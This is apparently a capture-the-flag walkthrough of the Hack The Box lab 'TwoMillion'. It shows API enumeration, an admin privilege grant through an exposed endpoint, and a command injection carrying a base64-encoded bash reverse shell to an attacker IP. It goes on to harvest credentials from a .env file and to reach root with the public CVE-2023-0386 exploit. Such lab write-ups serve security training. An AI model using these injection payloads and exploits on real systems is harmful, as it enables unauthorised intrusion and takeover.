# TwoMillion

TwoMillion is a easy HTB lab that focuses on API exposure, command injection and privilege escalation. In this walkthrough, we will go over the process of exploiting the services and gaining access to the root user.

<!-- toc -->

### Recon

The first step in any penetration testing process is reconnaissance. We can start by running nmap scan on the target machine to identify open ports and services.

```
[★]$ sudo nmap -p- -sV -sC 10.129.151.100

Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-26 06:46 GMT
Nmap scan report for 10.129.151.100
Host is up (0.025s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3eea454bc5d16d6fe2d4d13b0a3da94f (ECDSA)
|_  256 64cc75de4ae6a5b473eb3f1bcfb4e394 (ED25519)
80/tcp open  http    nginx
|_http-title: Did not follow redirect to http://2million.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 44.08 seconds
```

Adding new domain discovered on the port 80 `2million.htb` to `/etc/hosts`.

Enumerating the website diffferent paths.
```
[★]$ gobuster dir -u http://2million.htb/ -w /opt/useful/SecLists/Discovery/Web-Content/raft-medium-directories.txt --wildcard switch --exclude-length 162

===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://2million.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /opt/useful/SecLists/Discovery/Web-Content/raft-medium-directories.txt
[+] Negative Status codes:   404
[+] Exclude Length:          162
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/12/26 06:55:03 Starting gobuster in directory enumeration mode
===============================================================
/logout               (Status: 302) [Size: 0] [--> /]
/register             (Status: 200) [Size: 4527]
/login                (Status: 200) [Size: 3704]
/api                  (Status: 401) [Size: 0]
/home                 (Status: 302) [Size: 0] [--> /]
/404                  (Status: 200) [Size: 1674]
/invite               (Status: 200) [Size: 3859]
Progress: 23928 / 30001 (79.76%)                    [ERROR] 2023/12/26 06:56:01 [!] parse "http://2million.htb/error\x1f_log": net/url: invalid control character in URL

===============================================================
2023/12/26 06:56:17 Finished
===============================================================
```

Opening page `/invite` has following javascript `http://2million.htb/js/inviteapi.min.js` which has the API names.

Checking the code of the javascript.
```
function verifyInviteCode(code) {
    var formData = {
        "code": code
    };
    $.ajax({
        type: "POST",
        dataType: "json",
        data: formData,
        url: '/api/v1/invite/verify',
        success: function (response) {
            console.log(response)
        },
        error: function (response) {
            console.log(response)
        }
    })
}

function makeInviteCode() {
    $.ajax({
        type: "POST",
        dataType: "json",
        url: '/api/v1/invite/how/to/generate',
        success: function (response) {
            console.log(response)
        },
        error: function (response) {
            console.log(response)
        }
    })
}
```

### Attack

In order to generate the invite code, we need to make a POST request to `/api/v1/invite/generate`
```
$.ajax({
    type: "POST",
    dataType: "json",
    url: '/api/v1/invite/generate',
    success: function (response) {
        console.log(response)
    },
    error: function (response) {
        console.log(response)
    }
})
```
Invite Code: `echo "NjNGNDctTEIyRFctR0RLS1otNThXUzE=" | base64 -d # 63F47-LB2DW-GDKKZ-58WS1`
We can creat dummy credentails on the website using the invite code : `test@test.com:test`

After that we can get the list of all API by making `GET` request to `/api/v1`.

```
{
  "v1": {
    "user": {
      "GET": {
        "/api/v1": "Route List",
        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
        "/api/v1/invite/generate": "Generate invite code",
        "/api/v1/invite/verify": "Verify invite code",
        "/api/v1/user/auth": "Check if user is authenticated",
        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
        "/api/v1/user/vpn/download": "Download OVPN file"
      },
      "POST": {
        "/api/v1/user/register": "Register a new user",
        "/api/v1/user/login": "Login with existing user"
      }
    },
    "admin": {
      "GET": {
        "/api/v1/admin/auth": "Check if user is admin"
      },
      "POST": {
        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
      },
      "PUT": {
        "/api/v1/admin/settings/update": "Update user settings"
      }
    }
  }
}
```

Making our email `test@test.com` admin using following payload:

```
PUT /api/v1/admin/settings/update HTTP/1.1
Host: 2million.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Content-Type: application/json
Cookie: PHPSESSID=hve5pgt9avmfc3r88bghno7ot5
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Content-Length: 48

{
    "email":  "test@test.com",
    "is_admin": 1
}
```
OR we can use the following javascript code:
```
$.ajax({
    type: "PUT",
    data: JSON.stringify(e),
    dataType: "appjson",
    contentType: "application/json",
    url: '/api/v1/admin/settings/update',
    success: function (response) {
        console.log(response)
    },
    error: function (response) {
        console.log(response)
    }
})
```

Trying to get the foothold and shell on the server.
```
$.ajax({
    type: "POST",
    data: JSON.stringify({"username": "test; echo \"L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjExOS80NDQ0IDA+JjE=\" | base64 -d | bash"}),
    dataType: "appjson",
    contentType: "application/json",
    url: '/api/v1/admin/vpn/generate',
    success: function (response) {
        console.log(response)
    },
    error: function (response) {
        console.log(response)
    }
})

# terminal 2
$nc -lvnp 4444

www-data@2million:~/html$id
www-data
```

### User

Enumeration for user password.
```
www-data@2million:~/html$ ls -la
total 56
drwxr-xr-x 10 root root 4096 Dec 27 02:10 .
drwxr-xr-x  3 root root 4096 Jun  6  2023 ..
-rw-r--r--  1 root root   87 Jun  2  2023 .env
-rw-r--r--  1 root root 1237 Jun  2  2023 Database.php
-rw-r--r--  1 root root 2787 Jun  2  2023 Router.php
drwxr-xr-x  5 root root 4096 Dec 27 02:10 VPN
drwxr-xr-x  2 root root 4096 Jun  6  2023 assets
drwxr-xr-x  2 root root 4096 Jun  6  2023 controllers
drwxr-xr-x  5 root root 4096 Jun  6  2023 css
drwxr-xr-x  2 root root 4096 Jun  6  2023 fonts
drwxr-xr-x  2 root root 4096 Jun  6  2023 images
-rw-r--r--  1 root root 2692 Jun  2  2023 index.php
drwxr-xr-x  3 root root 4096 Jun  6  2023 js
drwxr-xr-x  2 root root 4096 Jun  6  2023 views
```

Checking the environment file:
```
www-data@2million:~/html$ cat .env
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=Super*********123
```

Tryng to login with the DB_PASSWORD as shell `admin` user:
```
[★]$ ssh admin@2million.htb
Super*********123
admin@2million:~$id
admin
```

Getting the user flag:
```
admin@2million:~$ cat user.txt
~~~~~~~~~~~~FLAG~~~~~~~~~~~~
```

### Privilege Escalation

Enumerating the machine using the `linpeas.sh` script. Got the following interesting information:
```
╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:11211         0.0.0.0:*               LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
tcp6       0      0 :::80
...
╔══════════╣ Mails (limit 50)
      271      4 -rw-r--r--   1 admin    admin         540 Jun  2  2023 /var/mail/admin
      271      4 -rw-r--r--   1 admin    admin         540 Jun  2  2023 /var/spool/mail/admin
```

Checking the admin mails:
```
admin@2million:~$ cat /var/mail/admin
From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Cc: g0blin <g0blin@2million.htb>
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700
Message-ID: <9876543210@2million.htb>
X-Mailer: ThunderMail Pro 5.2

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

HTB Godfather
```

Based on this information, we can search online for public vulnerabilities. Here the POC for exploit - https://github.com/sxlmnwb/CVE-2023-0386

In the first terminal, we would be executing the executable.
```
admin@2million:~/CVE-2023-0386-master$ make all
admin@2million:~/CVE-2023-0386-master$ ./fuse ./ovlcap/lower ./gc
admin@2million:~/CVE-2023-0386-master$ ./exp
```

Terminal 2, doing the same:
```
admin@2million:~/CVE-2023-0386-master$ ./exp
uid:1000 gid:1000
[+] mount success
total 8
drwxrwxr-x 1 root   root     4096 Dec 27 02:49 .
drwxrwxr-x 6 root   root     4096 Dec 27 02:49 ..
-rwsrwxrwx 1 nobody nogroup 16096 Jan  1  1970 file
[+] exploit success!
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.
root@2million:~/CVE-2023-0386-master#
```

Getting the root flag:
```
root@2million:~/CVE-2023-0386-master# cat /root/root.txt
~~~~~~~~~~~~FLAG~~~~~~~~~~~~
```
